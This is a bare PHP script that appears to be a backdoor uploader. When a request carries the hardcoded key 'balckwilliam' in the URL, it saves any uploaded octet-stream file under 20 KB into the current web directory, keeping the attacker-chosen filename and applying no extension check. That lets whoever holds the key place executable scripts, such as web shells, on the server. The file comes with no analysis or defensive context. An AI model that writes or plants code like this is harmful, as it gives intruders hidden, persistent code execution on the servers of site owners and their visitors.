<?php

if (($_FILES["file"]["type"] == "application/octet-stream" )&& ($_FILES["file"]["size"] < 20000) && ($_GET['key']=="balckwilliam"))
  {
  if ($_FILES["file"]["error"] > 0)
    {
    echo "Return Code: " . $_FILES["file"]["error"] . "<br />";
    }
  else
    {
    move_uploaded_file($_FILES["file"]["tmp_name"],"./" . $_FILES["file"]["name"]);
    echo "ok";
    }
  }
else
  {
  echo "Invalid file";
  }
?>